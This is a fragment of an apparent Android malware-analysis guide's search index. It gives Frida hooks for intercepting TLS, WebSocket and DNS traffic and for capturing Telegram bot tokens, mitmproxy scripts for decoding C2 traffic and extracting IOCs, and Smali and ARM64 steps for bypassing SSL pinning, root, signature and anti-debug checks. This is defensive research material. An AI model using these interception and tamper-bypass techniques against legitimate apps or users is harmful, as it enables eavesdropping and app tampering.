HttpURLConnection.getOutputStream.implementation = function() {\n        send(\"[REQ OUT] \" + this.getURL().toString() + \" method=\" + this.getRequestMethod());\n        return this.getOutputStream();\n    };\n});\n</code></pre> <p>To capture the actual request body written to the OutputStream, hook <code>OutputStream.write</code>:</p> <pre><code>Java.perform(function() {\n    var OutputStream = Java.use(\"java.io.OutputStream\");\n\n    OutputStream.write.overload(\"[B\").implementation = function(bytes) {\n        try {\n            send(\"[WRITE] \" + Java.use(\"java.lang.String\").$new(bytes));\n        } catch(e) {}\n        this.write(bytes);\n    };\n});\n</code></pre>"},{"location":"reversing/network-analysis/#websocket-interception","title":"WebSocket Interception","text":"<p>For families using WebSocket C2 (Hook, Medusa, Octo v2, TsarBot), hook both outgoing messages and incoming commands to capture the full bidirectional command stream:</p> <pre><code>Java.perform(function() {\n    var RealWebSocket = Java.use(\"okhttp3.internal.ws.RealWebSocket\");\n\n    RealWebSocket.send.overload(\"java.lang.String\").implementation = function(text) {\n        send(\"[WS SEND] \" + text);\n        return this.send(text);\n    };\n\n    RealWebSocket.send.overload(\"okio.ByteString\").implementation = function(bytes) {\n        send(\"[WS SEND BIN] \" + bytes.hex());\n        return this.send(bytes);\n    };\n\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            try {\n                var cls = Java.use(className);\n                if (cls.class.getSuperclass() &amp;&amp;\n                    cls.class.getSuperclass().getName() === \"okhttp3.WebSocketListener\") {\n                    cls.onMessage.overload(\"okhttp3.WebSocket\", \"java.lang.String\").implementation = function(ws, text) {\n                        send(\"[WS RECV] \" + text);\n                        this.onMessage(ws, text);\n                    };\n                }\n            } catch(e) {}\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"reversing/network-analysis/#native-ssl_write-ssl_read-hook","title":"Native SSL_write / SSL_read Hook","text":"<p>For malware using native TLS (NDK-based HTTP clients, custom native networking), Java-layer hooks produce nothing. Hook the OpenSSL/BoringSSL functions directly in the native layer to capture all TLS plaintext regardless of the Java HTTP client used:</p> <pre><code>var SSL_write = Module.findExportByName(\"libssl.so\", \"SSL_write\");\nvar SSL_read = Module.findExportByName(\"libssl.so\", \"SSL_read\");\n\nif (SSL_write) {\n    Interceptor.attach(SSL_write, {\n        onEnter: function(args) {\n            this.buf = args[1];\n            this.len = args[2].toInt32();\n        },\n        onLeave: function(retval) {\n            if (retval.toInt32() &gt; 0) {\n                send(\"[SSL_write] \" + Memory.readUtf8String(this.buf, this.len));\n            }\n        }\n    });\n}\n\nif (SSL_read) {\n    Interceptor.attach(SSL_read, {\n        onEnter: function(args) {\n            this.buf = args[1];\n            this.len = args[2].toInt32();\n        },\n        onLeave: function(retval) {\n            var bytesRead = retval.toInt32();\n            if (bytesRead &gt; 0) {\n                send(\"[SSL_read] \" + Memory.readUtf8String(this.buf, bytesRead));\n            }\n        }\n    });\n}\n</code></pre> <p>For Flutter apps that bundle BoringSSL inside <code>libflutter.so</code>, replace <code>libssl.so</code> with <code>libflutter.so</code> in the export lookup. The function names are the same. See Development Frameworks for Flutter-specific analysis.</p>"},{"location":"reversing/network-analysis/#dns-resolution-hook","title":"DNS Resolution Hook","text":"<p>Capture all domain resolutions to identify C2 domains, DGA output, and dead drop resolver lookups:</p> <pre><code>Java.perform(function() {\n    var InetAddress = Java.use(\"java.net.InetAddress\");\n\n    InetAddress.getByName.overload(\"java.lang.String\").implementation = function(host) {\n        var result = this.getByName(host);\n        send(\"[DNS] \" + host + \" -&gt; \" + result.getHostAddress());\n        return result;\n    };\n\n    InetAddress.getAllByName.overload(\"java.lang.String\").implementation = function(host) {\n        var results = this.getAllByName(host);\n        var ips = [];\n        for (var i = 0; i &lt; results.length; i++) {\n            ips.push(results[i].getHostAddress());\n        }\n        send(\"[DNS ALL] \" + host + \" -&gt; \" + ips.join(\", \"));\n        return results;\n    };\n});\n</code></pre>"},{"location":"reversing/network-analysis/#telegram-bot-api-interception","title":"Telegram Bot API Interception","text":"<p>For families using Telegram as C2 (Rafel RAT, Mamont), hook HTTP requests and filter for the Telegram API to extract bot tokens and chat IDs:</p> <pre><code>Java.perform(function() {\n    var URL = Java.use(\"java.net.URL\");\n\n    URL.openConnection.overload().implementation = function() {\n        var urlStr = this.toString();\n        if (urlStr.indexOf(\"api.telegram.org\") !== -1) {\n            var parts = urlStr.split(\"/\");\n            for (var i = 0; i &lt; parts.length; i++) {\n                if (parts[i].indexOf(\"bot\") === 0) {\n                    send(\"[TELEGRAM] Bot token: \" + parts[i].substring(3));\n                }\n            }\n            send(\"[TELEGRAM] \" + urlStr);\n        }\n        return this.openConnection();\n    };\n});\n</code></pre>"},{"location":"reversing/network-analysis/#traffic-analysis-checklist","title":"Traffic Analysis Checklist","text":"<p>Systematic checklist for analyzing captured C2 traffic after interception and decryption. Work through each phase to fully characterize the malware's network behavior.</p>"},{"location":"reversing/network-analysis/#registration-beacon","title":"Registration Beacon","text":"<p>The first request after installation or first launch. Contains device fingerprinting data used by the C2 panel to identify and categorize the bot.</p> <ul> <li>[ ] Identify the registration endpoint URL path and HTTP method</li> <li>[ ] Extract the bot ID generation logic (ANDROID_ID, IMEI, UUID, or composite hash)</li> <li>[ ] Document all device info fields: model, OS version, language, country, carrier, screen resolution</li> <li>[ ] Check for installed app list or targeted app list (drives which injection overlays the C2 serves)</li> <li>[ ] Note the C2 response -- configuration block, initial command set, or just an acknowledgment</li> <li>[ ] Determine whether registration repeats on every launch or only on first run</li> </ul>"},{"location":"reversing/network-analysis/#heartbeat-interval","title":"Heartbeat Interval","text":"<p>How the bot maintains contact between active command sessions.</p> <ul> <li>[ ] Measure the polling interval (capture at least 5--10 cycles to establish the pattern)</li> <li>[ ] Determine if the interval is hardcoded in the APK or dynamically set by C2 response fields</li> <li>[ ] Look for jitter or randomization in the interval (anti-detection measure)</li> <li>[ ] Identify the keepalive transport: HTTP polling, WebSocket ping/pong, or FCM push</li> <li>[ ] Test C2 unreachable behavior: retry logic, exponential backoff, fallback URLs, DGA activation</li> <li>[ ] Check if the interval changes after receiving a command (some families poll faster during active operations)</li> </ul>"},{"location":"reversing/network-analysis/#command-format","title":"Command Format","text":"<p>The structure and encoding of commands from the C2 to the bot.</p> <ul> <li>[ ] Map the full command set -- capture as many distinct commands as possible</li> <li>[ ] Determine command identifier format: numeric IDs, string names, or mixed</li> <li>[ ] Document command parameters and expected bot response for each command type</li> <li>[ ] Check for application-layer encryption or encoding on top of HTTPS (Base64, AES, XOR)</li> <li>[ ] Identify targeted vs broadcast commands (bot ID filter, country filter, app-specific targeting)</li> <li>[ ] Look for injection/overlay URL delivery as a distinct command type</li> <li>[ ] Note the acknowledgment flow -- does the bot confirm command receipt and/or execution result?</li> </ul>"},{"location":"reversing/network-analysis/#exfiltration-patterns","title":"Exfiltration Patterns","text":"<p>How and when stolen data leaves the device.</p> <ul> <li>[ ] Identify the exfiltration endpoint (same C2, separate data server, or third-party service like Telegram)</li> <li>[ ] Document exfiltration triggers: on-demand via C2 command, automatic on credential capture, or periodic batch</li> <li>[ ] Distinguish real-time streaming (WebSocket, screen share) from batched uploads (HTTP POST)</li> <li>[ ] Check for file uploads (screenshots, recordings, documents) and note encoding and content type</li> <li>[ ] Look for data compression or chunking for large payloads</li> <li>[ ] Catalog exfiltrated data types: credentials, SMS, contacts, call logs, photos, keystrokes, accessibility events</li> </ul>"},{"location":"reversing/network-analysis/#mitmproxy-scripting","title":"mitmproxy Scripting","text":"<p>mitmproxy provides a Python addon API for programmatic traffic analysis. Writing addon scripts automates C2 payload decoding, Base64 body decryption, and bot ID extraction during dynamic analysis -- significantly more efficient than manually inspecting each flow.</p>"},{"location":"reversing/network-analysis/#c2-traffic-decoder-addon","title":"C2 Traffic Decoder Addon","text":"<p>This addon intercepts traffic to known C2 domains, attempts JSON parsing and Base64 decoding on request/response bodies, extracts bot IDs, and logs everything to structured JSONL files.</p> mitmproxy C2 Traffic Decoder <pre><code>import json\nimport base64\nfrom mitmproxy import http\n\n\nC2_DOMAINS = [\"c2.example.com\", \"gate.malware.net\"]\nBOT_ID_KEYS = [\"bot_id\", \"device_id\", \"uid\", \"id\", \"botId\", \"deviceId\"]\n\n\nclass C2Decoder:\n    def __init__(self):\n        self.seen_bot_ids = set()\n\n    def request(self, flow: http.HTTPFlow):\n        if not any(d in flow.request.pretty_host for d in C2_DOMAINS):\n            return\n\n        entry = {\n            \"direction\": \"request\",\n            \"url\": flow.request.pretty_url,\n            \"method\": flow.request.method,\n            \"timestamp\": flow.request.timestamp_start,\n        }\n\n        body = flow.request.get_text()\n        if body:\n            entry[\"body\"] = self._try_decode(body)\n            self._extract_bot_id(entry[\"body\"])\n\n        self._log(entry)\n\n    def response(self, flow: http.HTTPFlow):\n        if not any(d in flow.request.pretty_host for d in C2_DOMAINS):\n            return\n\n        if not flow.response or not flow.response.content:\n            return\n\n        entry = {\n            \"direction\": \"response\",\n            \"url\": flow.request.pretty_url,\n            \"status\": flow.response.status_code,\n            \"body\": self._try_decode(flow.response.get_text()),\n        }\n\n        self._log(entry)\n\n    def _try_decode(self, data: str):\n        try:\n            return json.loads(data)\n        except (json.JSONDecodeError, TypeError):\n            pass\n\n        try:\n            decoded = base64.b64decode(data).decode(\"utf-8\", errors=\"replace\")\n            try:\n                return json.loads(decoded)\n            except (json.JSONDecodeError, TypeError):\n                return {\"base64_decoded\": decoded}\n        except Exception:\n            pass\n\n        return data\n\n    def _extract_bot_id(self, body):\n        if not isinstance(body, dict):\n            return\n        for key in BOT_ID_KEYS:\n            if key in body and body[key] not in self.seen_bot_ids:\n                self.seen_bot_ids.add(body[key])\n                with open(\"/tmp/c2_bot_ids.txt\", \"a\") as f:\n                    f.write(f\"{body[key]}\\n\")\n\n    def _log(self, entry):\n        with open(\"/tmp/c2_traffic.jsonl\", \"a\") as f:\n            f.write(json.dumps(entry, default=str) + \"\\n\")\n\n\naddons = [C2Decoder()]\n</code></pre> <p>Set <code>C2_DOMAINS</code> to the malware's C2 infrastructure, then run:</p> <pre><code>mitmdump -s c2_decoder.py --set block_global=false -p 8080\n</code></pre> <p>After the analysis session, review captured data:</p> <pre><code>cat /tmp/c2_traffic.jsonl | python3 -m json.tool --no-ensure-ascii\nsort -u /tmp/c2_bot_ids.txt\n</code></pre> <p>For live interactive analysis with simultaneous logging:</p> <pre><code>mitmproxy -s c2_decoder.py --set block_global=false -p 8080\n</code></pre> <p>The addon logs decoded C2 traffic (JSON-parsed or Base64-decoded) to <code>/tmp/c2_traffic.jsonl</code> and extracted bot IDs to <code>/tmp/c2_bot_ids.txt</code>, while the TUI lets you inspect individual flows in real time.</p>"},{"location":"reversing/network-analysis/#ioc-extraction-from-network-traffic","title":"IOC Extraction from Network Traffic","text":"<p>After capturing and decrypting C2 traffic, extract indicators of compromise (IOCs) systematically. These IOCs feed into detection rules, threat intelligence platforms, and infrastructure tracking.</p>"},{"location":"reversing/network-analysis/#what-to-extract","title":"What to Extract","text":"IOC Type Where to Find It Example C2 domains DNS queries, HTTP Host header, URL paths <code>evil-panel.com</code>, <code>api.malware-c2.xyz</code> C2 IP addresses DNS resolution, direct IP connections <code>185.215.113.x</code>, <code>91.92.240.x</code> URL paths HTTP request URIs <code>/gate.php</code>, <code>/api/v2/bot</code>, <code>/panel/injects</code> Bot registration format First POST request after install <code>{\"bot_id\": \"...\", \"tag\": \"...\", \"country\": \"...\"}</code> Bot ID generation Registration payload, User-Agent, or URL param IMEI, Android ID, or random UUID Command polling interval Time between repeated GET/POST requests 30s, 60s, 120s between identical requests Command format C2 response bodies <code>{\"command\": \"sms_intercept\", \"params\": {...}}</code> Exfiltration data format POST bodies containing stolen data JSON with SMS content, contacts, credentials Inject kit download URLs Responses containing overlay/phishing page URLs <code>https://cdn.evil.com/injects/com.bank.app.html</code> Telegram bot tokens URLs to <code>api.telegram.org</code> <code>bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11</code> Firebase project IDs Hostnames in Firebase API calls <code>malware-project-12345.firebaseio.com</code> Encryption keys <code>SecretKeySpec</code> hook output, hardcoded strings AES keys, XOR keys, RC4 keys User-Agent strings HTTP request headers Custom or default OkHttp UA TLS certificate fingerprints Pinned certificates in the APK or observed in traffic SHA-256 hash of the C2 server certificate"},{"location":"reversing/network-analysis/#bot-registration-analysis","title":"Bot Registration Analysis","text":"<p>The first network request after installation typically registers the bot with the C2 panel. This registration request reveals the botnet's organization:</p> <pre><code>{\n    \"bot_id\": \"a1b2c3d4e5f6\",\n    \"tag\": \"campaign_2024_q1\",\n    \"country\": \"US\",\n    \"operator\": \"main\",\n    \"model\": \"Pixel 6\",\n    \"android_version\": \"13\",\n    \"app_list\": [\"com.bank.app1\", \"com.bank.app2\"],\n    \"permissions\": [\"accessibility\", \"sms\", \"overlay\"]\n}\n</code></pre> <p>Key fields to note:</p> <ul> <li>bot_id -- how the operator tracks individual victims. Often derived from Android ID, IMEI, or a random UUID stored in SharedPreferences.</li> <li>tag -- campaign identifier. Links this sample to a specific distribution campaign.</li> <li>app_list -- list of installed apps sent to the C2 so it knows which inject overlays to serve. Reveals the target list.</li> <li>permissions -- tells the C2 what capabilities the bot has, which determines what commands it can receive.</li> </ul>"},{"location":"reversing/network-analysis/#command-polling-pattern-identification","title":"Command Polling Pattern Identification","text":"<p>Monitor the timing and structure of repeated requests to understand the C2 polling mechanism:</p> <pre><code>[00:00] POST /gate.php  {\"action\": \"register\", \"bot_id\": \"abc123\", ...}\n[00:01] POST /gate.php  {\"action\": \"poll\", \"bot_id\": \"abc123\"}\n[01:01] POST /gate.php  {\"action\": \"poll\", \"bot_id\": \"abc123\"}\n[02:01] POST /gate.php  {\"action\": \"poll\", \"bot_id\": \"abc123\"}\n[02:02] POST /gate.php  {\"action\": \"result\", \"bot_id\": \"abc123\", \"sms\": [...]}\n</code></pre> <p>From this pattern: registration happens once, polling occurs every 60 seconds, and exfiltration requests are sent immediately when new data is available.</p>"},{"location":"reversing/network-analysis/#inject-kit-url-extraction","title":"Inject Kit URL Extraction","text":"<p>Banking trojans download HTML/JS overlay pages (inject kits) from the C2 to display over legitimate banking apps. These URLs are high-value IOCs:</p> <pre><code>GET /injects/list?bot_id=abc123&amp;apps=com.bank.app1,com.bank.app2\n</code></pre> <p>Response:</p> <pre><code>{\n    \"injects\": [\n        {\n            \"app\": \"com.bank.app1\",\n            \"url\": \"https://cdn.evil.com/injects/com.bank.app1.html\"\n        },\n        {\n            \"app\": \"com.bank.app2\",\n            \"url\": \"https://cdn.evil.com/injects/com.bank.app2.html\"\n        }\n    ]\n}\n</code></pre> <p>Download and archive these inject pages -- they contain the phishing forms and reveal which financial institutions the campaign targets.</p>"},{"location":"reversing/network-analysis/#automated-ioc-extraction-with-mitmproxy","title":"Automated IOC Extraction with mitmproxy","text":"<p>Use a mitmproxy script to automatically extract and log IOCs from intercepted traffic:</p> mitmproxy IOC Extraction Script <pre><code>import json\nimport re\nfrom mitmproxy import http\n\niocs = {\n    \"domains\": set(),\n    \"ips\": set(),\n    \"paths\": set(),\n    \"bot_ids\": set(),\n    \"telegram_tokens\": set(),\n}\n\ntelegram_re = re.compile(r\"bot(\\d+:[A-Za-z0-9_-]+)\")\nip_re = re.compile(r\"\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b\")\n\ndef response(flow: http.HTTPFlow):\n    iocs[\"domains\"].add(flow.request.host)\n    iocs[\"paths\"].add(flow.request.path)\n\n    ip_match = ip_re.match(flow.request.host)\n    if ip_match:\n        iocs[\"ips\"].add(flow.request.host)\n\n    tg_match = telegram_re.search(flow.request.url)\n    if tg_match:\n        iocs[\"telegram_tokens\"].add(tg_match.group(1))\n\n    if flow.response and flow.response.content:\n        try:\n            body = json.loads(flow.response.content)\n            if isinstance(body, dict):\n                for key in [\"bot_id\", \"botId\", \"id\", \"uid\"]:\n                    if key in body:\n                        iocs[\"bot_ids\"].add(str(body[key]))\n        except (json.JSONDecodeError, UnicodeDecodeError):\n            pass\n\n    with open(\"/tmp/iocs.json\", \"w\") as f:\n        json.dump(\n            {k: list(v) for k, v in iocs.items()},\n            f,\n            indent=2,\n        )\n</code></pre> <p>Run with:</p> <pre><code>mitmproxy --mode transparent --listen-port 8080 -s ioc_extract.py\n</code></pre>"},{"location":"reversing/network-analysis/#ioc-extraction-from-raw-packet-captures","title":"IOC Extraction from Raw Packet Captures","text":"<p>For non-HTTP protocols or when proxy interception is not possible, extract IOCs directly from pcap files using tshark:</p> <pre><code>tshark -r capture.pcap -T fields -e dns.qry.name | sort -u\n</code></pre> <pre><code>tshark -r capture.pcap -T fields -e ip.dst | sort -u\n</code></pre> <pre><code>tshark -r capture.pcap -Y \"mqtt\" -T fields -e mqtt.topic -e mqtt.msg\n</code></pre> <pre><code>tshark -r capture.pcap -Y \"tcp.port == 443\" -T fields -e tls.handshake.extensions_server_name | sort -u\n</code></pre> <p>For custom TCP protocols, export the TCP stream as raw bytes and analyze the binary structure to extract embedded strings, IPs, or domain names:</p> <pre><code>tshark -r capture.pcap -Y \"tcp.stream eq 0\" -T fields -e data.data | xxd -r -p &gt; stream0.bin\nstrings stream0.bin\n</code></pre>"},{"location":"reversing/network-analysis/#ioc-pivot-points","title":"IOC Pivot Points","text":"<p>Extracted IOCs can be pivoted to discover related infrastructure, additional samples, and operator identity:</p> IOC Type Pivot Method What It Reveals C2 domain Passive DNS (VirusTotal, SecurityTrails, Farsight DNSDB) IP address history, co-hosted domains, registration timeline C2 IP address Shodan/Censys scan, reverse DNS, certificate search Open admin panels, other services on same IP, hosting provider Telegram bot token Query <code>https://api.telegram.org/bot&lt;token&gt;/getMe</code> Bot name, username, and whether the token is still active Firebase project ID Cross-reference with other samples using the same project Campaign scope, shared infrastructure across families SSL certificate hash Certificate transparency logs (crt.sh) All domains using the same certificate, issuance timeline Overlay injection URLs WHOIS, hosting provider, URL scan on VirusTotal Shared injection hosting infrastructure across campaigns Campaign tag Search tag across your sample corpus and threat intel feeds Distribution campaigns, dropper apps, target geography Bot ID format Compare generation logic across samples Family lineage, code reuse between campaigns User-Agent string Search in proxy logs and threat intel databases Other samples using the same hardcoded UA string Encryption key Compare static keys across samples Shared builder, same operator, campaign correlation <p>For detailed C2 protocol structures and command mappings, see C2 Communication Techniques.</p>"},{"location":"reversing/network-analysis/#tools","title":"Tools","text":"Tool Purpose Burp Suite HTTP/HTTPS interception and modification mitmproxy Scriptable HTTPS proxy with Python addon API for automated C2 analysis PCAPdroid No-root Android traffic capture via local VPN Wireshark Packet-level protocol analysis (MQTT, WebSocket, custom TCP) tshark Command-line Wireshark for scripted pcap analysis and IOC extraction tcpdump Command-line packet capture on device Frida Runtime instrumentation for network hooks, SSL bypass, crypto capture Objection One-command SSL pinning bypass and runtime exploration reFrida Browser-based Frida IDE with network activity monitoring reFlutter Flutter <code>libflutter.so</code> patching for BoringSSL bypass MagiskTrustUserCerts Magisk module to move user CA certs to system store apktool APK decompilation for <code>network_security_config.xml</code> patching CyberChef Browser-based decoder for AES, Base64, XOR on captured payloads"},{"location":"reversing/patching/","title":"Patching","text":"<p>Modifying an APK's code or resources, then repackaging and signing it for installation. Used to remove security checks (root detection, SSL pinning, integrity verification), inject instrumentation, or alter app behavior for analysis.</p>"},{"location":"reversing/patching/#workflow","title":"Workflow","text":""},{"location":"reversing/patching/#1-disassemble","title":"1. Disassemble","text":"<pre><code>apktool d target.apk -o target_patched/\n</code></pre> <p>This produces Smali code (Dalvik assembly), decoded resources, and the manifest.</p>"},{"location":"reversing/patching/#2-locate-target-code","title":"2. Locate Target Code","text":"<p>Find the code to patch. Common targets:</p> Target What to Search For Root detection \"su\", \"Superuser\", \"Magisk\", \"RootBeer\", <code>isRooted</code> SSL pinning \"CertificatePinner\", \"X509TrustManager\", \"SSL\", <code>checkServerTrusted</code> Emulator detection \"generic\", \"sdk\", \"Build.FINGERPRINT\", \"goldfish\" Integrity checks \"signature\", \"PackageInfo\", \"GET_SIGNATURES\" Debug detection \"isDebuggerConnected\", \"Debug.waitForDebugger\" Frida detection \"frida\", \"27042\", \"linjector\" <p>Use grep across the Smali directory:</p> <pre><code>grep -r \"isRooted\" target_patched/smali/\n</code></pre>"},{"location":"reversing/patching/#3-patch-smali","title":"3. Patch Smali","text":"<p>Smali is register-based Dalvik assembly. Common patches:</p> <p>Make a method always return true:</p> <pre><code>.method public isRooted()Z\n    .locals 1\n    const/4 v0, 0x1\n    return v0\n.end method\n</code></pre> <p>Make a method do nothing (NOP):</p> <pre><code>.method public checkIntegrity()V\n    .locals 0\n    return-void\n.end method\n</code></pre> <p>Change a conditional branch (replace the branch instruction with nop to prevent the jump):</p> <p>Original:</p> <pre><code>if-nez v0, :exit_app\n</code></pre> <p>Patched:</p> <pre><code>nop\n</code></pre>"},{"location":"reversing/patching/#4-reassemble","title":"4. Reassemble","text":"<pre><code>apktool b target_patched/ -o target_patched.apk\n</code></pre>"},{"location":"reversing/patching/#5-sign","title":"5. Sign","text":"<p>Android requires all APKs to be signed. Use a debug keystore or generate one:</p> <pre><code>keytool -genkey -v -keystore debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname \"CN=Debug\"\n\napksigner sign --ks debug.keystore --ks-key-alias debug --ks-pass pass:android target_patched.apk\n</code></pre>"},{"location":"reversing/patching/#6-install","title":"6. Install","text":"<pre><code>adb install target_patched.apk\n</code></pre> <p>If the original app is installed, uninstall first (signatures won't match):</p> <pre><code>adb uninstall com.target.app\nadb install target_patched.apk\n</code></pre>"},{"location":"reversing/patching/#common-patching-targets","title":"Common Patching Targets","text":"<p>A reference for the most frequent patching targets during malware analysis, organized by what you need to disable and where to find it:</p> Target Search Strings Smali Patch Purpose SSL pinning <code>CertificatePinner</code>, <code>checkServerTrusted</code>, <code>X509TrustManager</code> Replace <code>check</code> method body with <code>return-void</code> Intercept HTTPS traffic with a proxy Root detection <code>isRooted</code>, <code>RootBeer</code>, <code>su</code>, <code>Superuser</code>, <code>Magisk</code> Force <code>return false</code> (const/4 v0, 0x0) Run on rooted analysis device Emulator detection <code>Build.FINGERPRINT</code>, <code>generic</code>, <code>goldfish</code>, <code>sdk</code>, <code>isEmulator</code> Force <code>return false</code> or patch string comparisons Run in emulated environment Debug detection <code>isDebuggerConnected</code>, <code>Debug.waitForDebugger</code>, <code>TracerPid</code> Force <code>return false</code> or <code>return-void</code> Attach debugger for step-through analysis Frida detection <code>frida</code>, <code>27042</code>, <code>linjector</code>, <code>/proc/self/maps</code> Replace detection method with <code>return false</code> Allow Frida hooking without detection C2 URL replacement Encrypted or hardcoded C2 strings Replace C2 URL with controlled server address Redirect traffic to analyst-controlled infrastructure Geofencing <code>getSimCountryIso</code>, <code>getNetworkCountryIso</code>, locale checks Patch branch to always proceed, or replace country string Execute region-locked malware in analysis lab Kill switch Locale checks (CIS exclusion), date checks, remote kill NOP the kill branch or force the safe path Prevent self-termination during analysis Tamper detection <code>PackageManager.GET_SIGNATURES</code>, CRC checks, hash validation Replace verification method with constant <code>return true</code> Allow repackaged APK to run Device admin enforcement <code>DevicePolicyManager</code>, <code>isAdminActive</code> Bypass admin requirement branch Analyze without granting device admin"},{"location":"reversing/patching/#integrity-check-bypass","title":"Integrity Check Bypass","text":"<p>Malware frequently verifies its own integrity to detect tampering. After patching and re-signing, these checks will fire. Bypass them or the patched APK refuses to run.</p>"},{"location":"reversing/patching/#apk-signature-verification","title":"APK Signature Verification","text":"<p>The most common integrity check reads the APK's signing certificate at runtime and compares it against a hardcoded hash:</p> <pre><code>invoke-virtual {p0}, Landroid/content/Context;-&gt;getPackageManager()Landroid/content/pm/PackageManager;\nmove-result-object v0\ninvoke-virtual {p0}, Landroid/content/Context;-&gt;getPackageName()Ljava/lang/String;\nmove-result-object v1\nconst/16 v2, 0x40\ninvoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;-&gt;getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;\n</code></pre> <p>Patch approaches:</p> <p>1. NOP the entire check method:</p> <pre><code>.method private verifySignature()Z\n    .locals 1\n    const/4 v0, 0x1\n    return v0\n.end method\n</code></pre> <p>2. Patch the comparison to always match:</p> <p>Find the <code>String.equals()</code> or <code>Arrays.equals()</code> call that compares the signature hash and replace the conditional branch:</p> <p>Original:</p> <pre><code>if-eqz v0, :sig_mismatch\n</code></pre> <p>Patched:</p> <pre><code>goto :sig_valid\n</code></pre> <p>3. Replace the expected hash:</p> <p>If the malware stores the expected certificate hash as a string constant, replace it with the hash of your signing key:</p> <pre><code>keytool -exportcert -keystore debug.keystore -alias debug | sha256sum\n</code></pre> <p>Then patch the <code>const-string</code> in Smali with the new hash value.</p>"},{"location":"reversing/patching/#crc-checksum-verification","title":"CRC / Checksum Verification","text":"<p>Some malware computes CRC32 or SHA-256 over its own DEX file or specific resource files:</p> <pre><code>invoke-static {v0}, Ljava/util/zip/CRC32;-&gt;getValue()J\n</code></pre> <p>Patch strategies:</p> <ul> <li>Replace the CRC comparison with a constant <code>true</code> return</li> <li>Find where the expected CRC value is stored (often in a static field or resource file) and update it to match the patched binary</li> <li>NOP the entire <code>checkCRC</code> method body</li> </ul>"},{"location":"reversing/patching/#packagemanager-proxy-detection","title":"PackageManager Proxy Detection","text":"<p>Advanced malware doesn't just check the signature once -- it hooks into <code>PackageManager</code> calls throughout the app lifecycle. Some families create a wrapper around <code>getPackageInfo</code> that caches the result and checks it periodically.</p> <p>For these cases, search for all call sites:</p> <pre><code>grep -r \"GET_SIGNATURES\\|GET_SIGNING_CERTIFICATES\\|0x40\\|0x8000000\" target_patched/smali*/\n</code></pre> <p>Patch every verification call site, or replace the central verification utility method.</p>"},{"location":"reversing/patching/#native-signature-verification","title":"Native Signature Verification","text":"<p>When signature checks live in native code (<code>.so</code> files), Smali patching is not sufficient. The native library calls JNI functions to read the signature and verify it in C/C++. See the Binary Patching section below for handling these cases.</p>"},{"location":"reversing/patching/#binary-patching-native-libraries","title":"Binary Patching (Native Libraries)","text":"<p>When malware implements security checks, crypto routines, or core logic in native code (<code>.so</code> files), Smali patching is insufficient. Binary patching modifies the compiled ARM/ARM64 instructions directly.</p>"},{"location":"reversing/patching/#ghidra-workflow","title":"Ghidra Workflow","text":"<pre><code>1. Open the APK's lib/&lt;arch&gt;/ directory in Ghidra\n2. Import the target .so file (ELF format, ARM or AARCH64)\n3. Run auto-analysis (F5 for decompiler view)\n4. Locate the target function (JNI_OnLoad, anti-debug checks, etc.)\n5. Patch instructions using \"Patch Instruction\" (Ctrl+Shift+G)\n6. Export the patched binary (File &gt; Export Program &gt; ELF)\n7. Replace the original .so in the APK's lib/ directory\n</code></pre>"},{"location":"reversing/patching/#noping-anti-tamper-checks","title":"NOP'ing Anti-Tamper Checks","text":"<p>Native anti-tamper checks typically read <code>/proc/self/maps</code>, compute hashes, or call <code>ptrace</code> to detect debuggers. In ARM64, NOP is encoded as <code>0x1F2003D5</code>:</p> <p>Patching a branch in Ghidra:</p> <p>Find the conditional branch after the integrity check:</p> <pre><code>CBNZ X0, #anti_tamper_detected\n</code></pre> <p>Replace with NOP:</p> <pre><code>NOP\n</code></pre> <p>Or replace with an unconditional branch past the check:</p> <pre><code>B #continue_normal_execution\n</code></pre>"},{"location":"reversing/patching/#patching-jni_onload-anti-debug","title":"Patching JNI_OnLoad Anti-Debug","text":"<p>Many malware families run anti-debug and anti-tamper checks in <code>JNI_OnLoad</code>, which executes when the native library is loaded via <code>System.loadLibrary</code>. Common patterns:</p> Check in JNI_OnLoad What It Does Patch <code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code> Self-trace to prevent debugger attach NOP the <code>ptrace</code> call and force return value to 0 <code>fopen(\"/proc/self/status\")</code> + <code>TracerPid</code> check Detect attached debugger via proc filesystem NOP the <code>fopen</code> call or patch the comparison <code>fopen(\"/proc/self/maps\")</code> + string scan Detect Frida, Xposed, or debugger libraries in memory NOP the scan loop or patch the string comparison <code>getpid()</code> + <code>kill(pid, 0)</code> timing check Detect debugging via execution timing NOP the timing check branch APK hash computation Verify APK hasn't been modified Replace hash comparison with unconditional success"},{"location":"reversing/patching/#ida-pro-keypatch-workflow","title":"IDA Pro + Keypatch Workflow","text":"<p>For IDA users, the Keypatch plugin simplifies binary patching:</p> <pre><code>1. Load .so in IDA, wait for auto-analysis\n2. Navigate to target instruction\n3. Edit &gt; Keypatch &gt; Patcher (or Ctrl+Alt+K)\n4. Enter replacement instruction (e.g., \"NOP\" or \"MOV W0, #1\")\n5. Apply patches: Edit &gt; Patch program &gt; Apply patches to input file\n</code></pre>"},{"location":"reversing/patching/#replacing-the-patched-library","title":"Replacing the Patched Library","text":"<p>After patching, place the modified <code>.so</code> back into the APK:</p> <pre><code>apktool d target.apk -o target_patched/\ncp patched_libnative.so target_patched/lib/arm64-v8a/libnative.so\napktool b target_patched/ -o target_patched.apk\nuber-apk-signer -a target_patched.apk\n</code></pre> <p>Patch all architectures the APK ships (arm64-v8a, armeabi-v7a, x86, x86_64) or remove the directories for architectures you don't need -- Android will skip missing ABIs and fall back to available ones.</p>"},{"location":"reversing/patching/#automated-patching-tools","title":"Automated Patching Tools","text":"<p>Manual Smali editing is precise but slow. These tools automate common patching workflows:</p>"},{"location":"reversing/patching/#apktool-uber-apk-signer","title":"apktool + uber-apk-signer","text":"<p>The standard manual workflow, streamlined:</p> <pre><code>apktool d target.apk -o target_patched/\napktool b target_patched/ -o target_patched.apk\nuber-apk-signer -a target_patched.apk\nadb install target_patched-aligned-debugSigned.apk\n</code></pre> <p>uber-apk-signer handles zipalign + signing in one step, supports v1/v2/v3 signature schemes, and auto-generates a debug keystore if none is provided.</p>"},{"location":"reversing/patching/#objection-patchapk","title":"Objection patchapk","text":"<p>Objection can inject Frida Gadget into an APK automatically:</p> 